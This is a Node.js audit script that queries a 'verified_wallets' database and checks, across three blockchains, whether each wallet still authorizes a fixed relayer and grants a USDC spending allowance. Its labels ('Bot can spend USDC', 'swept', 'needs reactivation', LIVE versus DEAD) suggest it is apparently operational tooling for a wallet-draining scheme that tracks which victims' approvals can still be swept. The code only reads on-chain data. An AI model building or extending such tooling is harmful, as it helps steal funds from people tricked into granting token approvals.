/**
 * One-shot audit: every verified_wallets row → live on-chain authorize + USDC allowance.
 * Usage: node --env-file=.env.production scripts/audit-approvals.mjs
 */
import { createClient } from "@supabase/supabase-js";
import { Contract, FetchRequest, JsonRpcProvider, getAddress, isAddress } from "ethers";

const RELAYER = "0x1826d8D10F6a6deadDB401Fe2843fdBf34855414";

const CHAINS = [
  {
    name: "eth",
    label: "Ethereum",
    chainId: 1,
    contract: "0x2928b3a9fc67608D13dE22eD69Bbf61fDF53A3e4",
    usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    rpcs: [
      process.env.QUICKNODE_ETH_RPC_URL,
      "https://ethereum-rpc.publicnode.com",
      "https://rpc.ankr.com/eth",
    ].filter(Boolean),
  },
  {
    name: "bnb",
    label: "BNB Chain",
    chainId: 56,
    contract: "0x82C29f687d7Ad7e8A1DAffCA2dec25B5A85dc281",
    usdc: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    rpcs: [
      process.env.QUICKNODE_BSC_RPC_URL,
      "https://bsc-dataseed.binance.org",
      "https://bsc-rpc.publicnode.com",
    ].filter(Boolean),
  },
  {
    name: "polygon",
    label: "Polygon",
    chainId: 137,
    contract: "0x272b94a0251c32aDb180d8eEa179c66335EBF34D",
    usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    rpcs: [
      process.env.QUICKNODE_POLYGON_RPC_URL,
      "https://polygon-bor-rpc.publicnode.com",
      "https://polygon.drpc.org",
    ].filter(Boolean),
  },
];

const AUTH_ABI = [
  "function isAuthorized(address user, address relayer) view returns (bool)",
];
const ERC20_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
];

async function providerFor(chain) {
  let last;
  for (const url of chain.rpcs) {
    try {
      const request = new FetchRequest(url);
      request.timeout = 8000;
      const p = new JsonRpcProvider(request, chain.chainId, { staticNetwork: true });
      await p.getBlockNumber();
      return p;
    } catch (e) {
      last = e;
    }
  }
  throw last ?? new Error(`no rpc for ${chain.name}`);
}

async function checkRow(row) {
  const chain = CHAINS.find((c) => c.name === row.chain);
  if (!chain) {
    return {
      address: row.address,
      chain: row.chain,
      ok: false,
      error: "unsupported_chain",
    };
  }
  if (!isAddress(row.address)) {
    return {
      address: row.address,
      chain: row.chain,
      ok: false,
      error: "invalid_address",
    };
  }
  try {
    const provider = await providerFor(chain);
    const owner = getAddress(row.address);
    const verification = new Contract(chain.contract, AUTH_ABI, provider);
    const erc20 = new Contract(chain.usdc, ERC20_ABI, provider);
    const authorized = await verification.isAuthorized(owner, RELAYER);
    const allowance = await erc20.allowance(owner, chain.contract);
    const usdcLive = allowance > 0n;
    const botSees = !!authorized;
    return {
      address: owner,
      chain: chain.name,
      label: chain.label,
      dbAuthorized: !!row.authorized,
      onChainAuthorized: botSees,
      usdcAllowanceLive: usdcLive,
      botCanSeeAuthorize: botSees,
      botCanSpendUsdc: usdcLive,
      live: botSees && usdcLive,
      sweptAt: row.swept_at ?? null,
      needsReactivation: !!row.needs_reactivation,
    };
  } catch (e) {
    return {
      address: row.address,
      chain: row.chain,
      ok: false,
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

async function main() {
  const url = process.env.SUPABASE_URL;
  const key = process.env.SUPABASE_SERVICE_ROLE_KEY;
  if (!url || !key) {
    console.error("Missing SUPABASE_URL / SUPABASE_SERVICE_ROLE_KEY");
    process.exit(1);
  }

  const db = createClient(url, key, { auth: { persistSession: false } });
  const { data, error } = await db
    .from("verified_wallets")
    .select("address, chain, authorized, approved_tokens, needs_reactivation, swept_at")
    .in("chain", ["eth", "bnb", "polygon"])
    .order("updated_at", { ascending: false });

  if (error) {
    console.error("Supabase error:", error.message);
    process.exit(1);
  }

  const rows = data ?? [];
  console.log(`\nAuditing ${rows.length} verified_wallets rows (eth/bnb/polygon)…\n`);

  const results = [];
  // Concurrency 4 to avoid hammering RPCs
  const queue = [...rows];
  const workers = Array.from({ length: 4 }, async () => {
    while (queue.length) {
      const row = queue.shift();
      if (!row) break;
      const r = await checkRow(row);
      results.push(r);
      const tag = r.live
        ? "LIVE"
        : r.error
          ? "ERR "
          : r.onChainAuthorized
            ? "AUTH-only"
            : "DEAD";
      console.log(
        `${tag.padEnd(9)} ${String(r.chain).padEnd(8)} ${r.address}  auth=${r.onChainAuthorized ?? "?"} usdc=${r.usdcAllowanceLive ?? "?"}${r.error ? "  " + r.error : ""}`
      );
    }
  });
  await Promise.all(workers);

  const live = results.filter((r) => r.live);
  const authOnly = results.filter(
    (r) => r.onChainAuthorized && !r.usdcAllowanceLive && !r.error
  );
  const dead = results.filter(
    (r) => !r.error && !r.onChainAuthorized && !r.usdcAllowanceLive
  );
  const errs = results.filter((r) => r.error);

  const uniqueLive = new Set(live.map((r) => r.address.toLowerCase()));
  const uniqueAll = new Set(results.map((r) => String(r.address).toLowerCase()));

  console.log("\n======== APPROVAL AUDIT REPORT ========");
  console.log(`Rows checked:           ${results.length}`);
  console.log(`Unique addresses:       ${uniqueAll.size}`);
  console.log(`LIVE (auth + USDC):     ${live.length} rows / ${uniqueLive.size} addresses`);
  console.log(`Authorize only:         ${authOnly.length}`);
  console.log(`Dead (neither):         ${dead.length}`);
  console.log(`RPC / errors:           ${errs.length}`);
  console.log("\nBot can see authorize (isAuthorized=true):");
  console.log(
    `  ${results.filter((r) => r.botCanSeeAuthorize).length} of ${results.length}`
  );
  console.log("Bot can spend USDC (allowance>0):");
  console.log(
    `  ${results.filter((r) => r.botCanSpendUsdc).length} of ${results.length}`
  );

  if (live.length) {
    console.log("\n--- LIVE rows ---");
    for (const r of live) {
      console.log(`${r.chain.padEnd(8)} ${r.address}${r.sweptAt ? "  (swept)" : ""}`);
    }
  }
  if (authOnly.length) {
    console.log("\n--- Authorize live, USDC allowance missing ---");
    for (const r of authOnly) {
      console.log(`${r.chain.padEnd(8)} ${r.address}`);
    }
  }
  console.log("\n=======================================\n");
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
